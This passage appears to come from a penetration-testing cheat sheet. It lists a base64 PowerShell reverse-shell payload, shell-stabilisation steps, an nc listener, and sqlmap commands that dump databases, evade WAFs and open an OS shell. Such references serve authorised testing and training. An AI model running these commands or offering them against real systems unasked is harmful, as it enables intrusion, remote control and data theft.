| powershell: generate from revshells.com → "PowerShell #3 (Base64)" → `powershell -e <b64>`                                                                  |

**Stabilise a dumb shell:** `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm`. Listener: `rlwrap -cAr nc -lnvp <PORT>`. Grab payloads from **revshells.com**.

---

## 21) sqlmap (when manual UNION is slow)

| Goal | Command |
|---|---|
| From a saved Burp request (mark `*` at inject point) | `sqlmap -r req.txt --batch --dump` |
| Escalate | `sqlmap -r req.txt --batch --level 5 --risk 3 --dbms=mysql` |
| WAF / rate-limit | add `--random-agent --tamper=between --delay 1 --threads 1` |
| OS shell (if stacked/privs) | `sqlmap -r req.txt --os-shell` |

> On a WAF'd/rate-limited target sqlmap trips the block — go **manual UNION** (fingerprint with `@@version` first; MSSQL vs MySQL syntax differs).
